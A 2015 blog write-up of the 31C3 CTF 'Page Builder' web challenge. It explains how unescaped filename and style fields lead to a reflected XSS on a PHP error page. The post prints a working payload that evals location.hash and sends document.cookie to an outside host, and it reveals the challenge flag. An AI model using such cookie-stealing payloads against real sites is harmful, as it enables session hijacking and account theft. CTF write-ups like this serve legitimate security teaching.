---
title: 31C3 CTF – Page Builder writeup
author: tyage
type: posts
date: 2015-01-02T00:32:50+00:00
url: /?p=829
categories:
  - CTF

---
<p>This challenge needs only XSS but it is interesting to me 🙂</p>
<blockquote><p>
These guys have ripped off our designs and using them in their web pages builder! We’d Haxx them, don’t worry we’ll give you decent points for it. http://188.40.18.76/
</p></blockquote>
<p><a href="https://blog.tyage.net/wp-content/uploads/2015/01/96291d2119ed92471bf6a9a94b458fda.png"><img data-attachment-id="831" data-permalink="https://blog.tyage.net/?attachment_id=831" data-orig-file="https://blog.tyage.net/wp-content/uploads/2015/01/96291d2119ed92471bf6a9a94b458fda.png" data-orig-size="742,388" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="スクリーンショット 2015-01-02 8.40.09" data-image-description="" data-medium-file="https://blog.tyage.net/wp-content/uploads/2015/01/96291d2119ed92471bf6a9a94b458fda.png" data-large-file="https://blog.tyage.net/wp-content/uploads/2015/01/96291d2119ed92471bf6a9a94b458fda.png" src="http://blog.tyage.net/wp-content/uploads/2015/01/96291d2119ed92471bf6a9a94b458fda-300x157.png" alt="スクリーンショット 2015-01-02 8.40.09" width="300" height="157" class="alignnone size-medium wp-image-831" /></a></p>
<p>By using the form, we could generate a page.(such as http://188.40.18.76/output/19c94d778563b117e18e3442e887989aea14277d/filename)</p>
<p>It htmlspecialchars the &#8220;title&#8221; and &#8220;file content&#8221; but not &#8220;style&#8221; or &#8220;filename&#8221;.</p>
<p>The maximum size of &#8220;style&#8221; is 8bytes and that of &#8220;filename&#8221; is 65bytes.</p>
<p>Then, &#8220;filename&#8221; can be <code>foo.php</code> and &#8220;style&#8221; can be <code>&lt;?php a</code> so that it shows PHP error.</p>
<p>(<a href="http://188.40.18.76/output/19c94d778563b117e18e3442e887989aea14277d/foo.php">http://188.40.18.76/output/19c94d778563b117e18e3442e887989aea14277d/foo.php</a>)</p>
<blockquote><p>
Parse error: syntax error, unexpected &#8216;&#8221; rel=&#8221;&#8216; (T_CONSTANT_ENCAPSED_STRING) in /var/www/html/output/19c94d778563b117e18e3442e887989aea14277d/foo.php on line 10
</p></blockquote>
<p>hmm&#8230; PHP code exeution looks difficult because maximum size of &#8220;style&#8221; is 8bytes and short_open_tag is offed. (and <code>*</code> is removed from &#8220;title&#8221; and &#8220;file content&#8221;)</p>
<p>So let&#8217;s search another vulnerability.</p>
<p>We can XSS with &#8220;filename&#8221;, because the error page above prints &#8220;filename&#8221; that is not escaped!</p>
<blockquote><p>
http://188.40.18.76/output/19c94d778563b117e18e3442e887989aea14277d/%3Cbody onload=%22eval%28location.hash.slice%281%29%29%22.php#<br />
location.href=%27http://tyage.net/%27+document.cookie
</p></blockquote>
<p>(Notice: we put the code in <code>location.hash</code> to fit in the maximum length of &#8220;filename&#8221;)</p>
<p>Now, just submit a link above in the contact form and we capture the flag!</p>
<p><code>31c3_Y0u_H4v3_F0und_My_W34k_Err0R_P01n7</code></p>
